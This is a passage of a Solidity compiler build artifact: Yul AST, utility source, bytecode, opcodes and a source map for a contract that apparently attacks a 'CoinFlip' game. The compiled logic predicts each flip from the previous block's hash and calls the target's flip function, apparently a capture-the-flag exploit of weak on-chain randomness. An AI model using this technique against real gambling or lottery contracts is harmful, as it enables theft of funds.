													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1040:4:2",
														"type": ""
													}
												],
												"src": "932:252:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1232:143:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1242:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1265:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1247:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1247:20:2"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "1242:1:2"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1276:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1299:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1281:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1281:20:2"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "1276:1:2"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1323:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nodeType": "YulIdentifier",
																				"src": "1325:16:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1325:18:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1325:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1320:1:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1313:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1313:9:2"
															},
															"nodeType": "YulIf",
															"src": "1310:2:2"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1355:14:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1364:1:2"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1367:1:2"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nodeType": "YulIdentifier",
																	"src": "1360:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1360:9:2"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nodeType": "YulIdentifier",
																	"src": "1355:1:2"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "1221:1:2",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "1224:1:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nodeType": "YulTypedName",
														"src": "1230:1:2",
														"type": ""
													}
												],
												"src": "1190:185:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1426:146:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1436:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1459:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1441:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1441:20:2"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "1436:1:2"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1470:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1493:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1475:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1475:20:2"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "1470:1:2"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1517:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "1519:16:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1519:18:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1519:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1511:1:2"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1514:1:2"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "1508:2:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1508:8:2"
															},
															"nodeType": "YulIf",
															"src": "1505:2:2"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1549:17:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1561:1:2"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1564:1:2"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "1557:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1557:9:2"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nodeType": "YulIdentifier",
																	"src": "1549:4:2"
																}
															]
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "1412:1:2",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "1415:1:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nodeType": "YulTypedName",
														"src": "1421:4:2",
														"type": ""
													}
												],
												"src": "1381:191:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1620:48:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1630:32:2",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1655:5:2"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "1648:6:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1648:13:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1641:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1641:21:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1630:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1602:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1612:7:2",
														"type": ""
													}
												],
												"src": "1578:90:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1719:81:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1729:65:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1744:5:2"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1751:42:2",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "1740:3:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1740:54:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1729:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1701:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1711:7:2",
														"type": ""
													}
												],
												"src": "1674:126:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1851:32:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1861:16:2",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "1872:5:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1861:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1833:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1843:7:2",
														"type": ""
													}
												],
												"src": "1806:77:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1964:81:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1974:65:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2033:5:2"
																	}
																],
																"functionName": {
																	"name": "convert_t_contract$_CoinFlip_$81_to_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "1987:45:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "1987:52:2"
															},
															"variableNames": [
																{
																	"name": "converted",
																	"nodeType": "YulIdentifier",
																	"src": "1974:9:2"
																}
															]
														}
													]
												},
												"name": "convert_t_contract$_CoinFlip_$81_to_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1944:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "converted",
														"nodeType": "YulTypedName",
														"src": "1954:9:2",
														"type": ""
													}
												],
												"src": "1889:156:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2126:53:2",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2136:37:2",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2167:5:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "2149:17:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2149:24:2"
															},
															"variableNames": [
																{
																	"name": "converted",
																	"nodeType": "YulIdentifier",
																	"src": "2136:9:2"
																}
															]
														}
													]
												},
												"name": "convert_t_contract$_CoinFlip_$81_to_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2106:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "converted",
														"nodeType": "YulTypedName",
														"src": "2116:9:2",
														"type": ""
													}
												],
												"src": "2051:128:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2213:152:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2230:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2233:77:2",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2223:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2223:88:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2223:88:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2327:1:2",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2330:4:2",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2320:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2320:15:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2320:15:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2351:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2354:4:2",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2344:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2344:15:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2344:15:2"
														}
													]
												},
												"name": "panic_error_0x11",
												"nodeType": "YulFunctionDefinition",
												"src": "2185:180:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2399:152:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2416:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2419:77:2",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2409:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2409:88:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2409:88:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2513:1:2",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2516:4:2",
																		"type": "",
																		"value": "0x12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2506:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2506:15:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2506:15:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2537:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2540:4:2",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2530:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2530:15:2"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2530:15:2"
														}
													]
												},
												"name": "panic_error_0x12",
												"nodeType": "YulFunctionDefinition",
												"src": "2371:180:2"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2597:76:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2651:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2660:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2663:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "2653:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2653:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2653:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "2620:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "2642:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nodeType": "YulIdentifier",
																					"src": "2627:14:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "2627:21:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "2617:2:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2617:32:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "2610:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2610:40:2"
															},
															"nodeType": "YulIf",
															"src": "2607:2:2"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2590:5:2",
														"type": ""
													}
												],
												"src": "2557:116:2"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_bool_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_t_contract$_CoinFlip_$81_to_t_address_fromStack(value, pos) {\n        mstore(pos, convert_t_contract$_CoinFlip_$81_to_t_address(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_contract$_CoinFlip_$81__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_contract$_CoinFlip_$81_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function convert_t_contract$_CoinFlip_$81_to_t_address(value) -> converted {\n        converted := convert_t_contract$_CoinFlip_$81_to_t_uint160(value)\n    }\n\n    function convert_t_contract$_CoinFlip_$81_to_t_uint160(value) -> converted {\n        converted := cleanup_t_uint160(value)\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c806353b3b3b31461003b578063931c9f3214610059575b600080fd5b610043610063565b60405161005091906101ec565b60405180910390f35b610061610087565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60006001436100969190610238565b4060001c90506000600154826100ac9190610207565b90506000600182146100bf5760006100c2565b60015b905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b815260040161011d91906101d1565b602060405180830381600087803b15801561013757600080fd5b505af115801561014b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061016f919061018a565b50505050565b60008151905061018481610324565b92915050565b60006020828403121561019c57600080fd5b60006101aa84828501610175565b91505092915050565b6101bc8161026c565b82525050565b6101cb816102a2565b82525050565b60006020820190506101e660008301846101b3565b92915050565b600060208201905061020160008301846101c2565b92915050565b600061021282610298565b915061021d83610298565b92508261022d5761022c6102f5565b5b828204905092915050565b600061024382610298565b915061024e83610298565b925082821015610261576102606102c6565b5b828203905092915050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006102ad826102b4565b9050919050565b60006102bf82610278565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b61032d8161026c565b811461033857600080fd5b5056fea2646970667358221220543d1d06066c46476da9229d6d949d3ccab3a77528281795b03d89c9bb2ead3d64736f6c63430008000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x53B3B3B3 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x931C9F32 EQ PUSH2 0x59 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x63 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x1EC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x61 PUSH2 0x87 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 NUMBER PUSH2 0x96 SWAP2 SWAP1 PUSH2 0x238 JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH1 0x0 PUSH1 0x1 SLOAD DUP3 PUSH2 0xAC SWAP2 SWAP1 PUSH2 0x207 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xBF JUMPI PUSH1 0x0 PUSH2 0xC2 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x11D SWAP2 SWAP1 PUSH2 0x1D1 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x137 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x14B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x16F SWAP2 SWAP1 PUSH2 0x18A JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x184 DUP2 PUSH2 0x324 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x19C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x1AA DUP5 DUP3 DUP6 ADD PUSH2 0x175 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x1BC DUP2 PUSH2 0x26C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x1CB DUP2 PUSH2 0x2A2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1E6 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1B3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x201 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1C2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x212 DUP3 PUSH2 0x298 JUMP JUMPDEST SWAP2 POP PUSH2 0x21D DUP4 PUSH2 0x298 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x22D JUMPI PUSH2 0x22C PUSH2 0x2F5 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x243 DUP3 PUSH2 0x298 JUMP JUMPDEST SWAP2 POP PUSH2 0x24E DUP4 PUSH2 0x298 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x261 JUMPI PUSH2 0x260 PUSH2 0x2C6 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2AD DUP3 PUSH2 0x2B4 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2BF DUP3 PUSH2 0x278 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x32D DUP2 PUSH2 0x26C JUMP JUMPDEST DUP2 EQ PUSH2 0x338 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SLOAD RETURNDATASIZE SAR MOD MOD PUSH13 0x46476DA9229D6D949D3CCAB3A7 PUSH22 0x28281795B03D89C9BB2EAD3D64736F6C634300080000 CALLER ",
							"sourceMap": "86:535:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;116:32;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;374:244;;;:::i;:::-;;116:32;;;;;;;;;;;;:::o;374:244::-;415:18;467:1;454:12;:14;;;;:::i;:::-;444:25;436:34;;415:55;;481:16;511:6;;500:10;:17;;;;:::i;:::-;481:36;;528:10;553:1;541:8;:13;:28;;564:5;541:28;;;557:4;541:28;528:41;;582:16;;;;;;;;;;:21;;;604:5;582:28;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;374:244;;;:::o;7:137:2:-;;92:6;86:13;77:22;;108:30;132:5;108:30;:::i;:::-;67:77;;;;:::o;150:278::-;;266:2;254:9;245:7;241:23;237:32;234:2;;;282:1;279;272:12;234:2;325:1;350:61;403:7;394:6;383:9;379:22;350:61;:::i;:::-;340:71;;296:125;224:204;;;;:::o;434:109::-;515:21;530:5;515:21;:::i;:::-;510:3;503:34;493:50;;:::o;549:161::-;651:52;697:5;651:52;:::i;:::-;646:3;639:65;629:81;;:::o;716:210::-;;841:2;830:9;826:18;818:26;;854:65;916:1;905:9;901:17;892:6;854:65;:::i;:::-;808:118;;;;:::o;932:252::-;;1078:2;1067:9;1063:18;1055:26;;1091:86;1174:1;1163:9;1159:17;1150:6;1091:86;:::i;:::-;1045:139;;;;:::o;1190:185::-;;1247:20;1265:1;1247:20;:::i;:::-;1242:25;;1281:20;1299:1;1281:20;:::i;:::-;1276:25;;1320:1;1310:2;;1325:18;;:::i;:::-;1310:2;1367:1;1364;1360:9;1355:14;;1232:143;;;;:::o;1381:191::-;;1441:20;1459:1;1441:20;:::i;:::-;1436:2